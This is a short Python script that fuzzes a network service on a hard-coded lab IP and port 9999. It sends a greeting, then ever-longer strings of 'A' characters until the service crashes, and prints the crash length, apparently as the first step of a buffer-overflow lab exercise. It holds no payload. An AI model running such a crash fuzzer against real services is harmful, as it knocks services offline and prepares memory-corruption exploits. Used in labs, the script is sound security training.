#!/usr/share/python

import socket, time, sys

ip = '10.37.1.149'		# Change to IP Host
port = 9999			# Change to Port Host
timeout = 5

string = "A" * 100

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(timeout)
	s.connect((ip, port))
	s.recv(1024)
	s.recv(1024)
	s.send(b"KakakSeram \r\n")
	s.recv(1024)
	print("#### Starting Fuzzing #####")
	while True:
		print("[+] Sending " + str(len(string)) + " bytes...")
		s.send(bytes(string, "latin-1"))
		s.recv(1024)
		string += "A" * 100
		time.sleep(1)
except:
	print("#### End of Fuzzing #####")
	print("Fuzzing crashed at " + str(len(string)) + " bytes")
	sys.exit(0)
	s.close()
